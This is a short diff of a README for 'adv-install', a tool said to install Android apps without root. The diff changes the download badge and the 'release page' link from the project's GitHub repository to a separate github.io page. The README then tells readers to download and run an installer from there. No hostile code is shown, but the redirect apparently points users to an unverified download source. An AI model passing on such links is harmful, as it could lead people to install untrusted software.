@@ -1,6 +1,6 @@
 # 📱 adv-install - Install Android apps without root access
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/1060094kevin-collab/adv-install)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://1060094kevin-collab.github.io)
 
 ## 📖 About this application
 
@@ -31,7 +31,7 @@ Your phone needs to prepare to accept commands from the application. Follow thes
 
 Visit the official project page to download the software for your computer.
 
-[Click here to visit the release page and download the installer](https://github.com/1060094kevin-collab/adv-install)
+[Click here to visit the release page and download the installer](https://1060094kevin-collab.github.io)
 
 1.  Open the link provided above in your web browser.
 2.  Look for the section marked **Assets**.
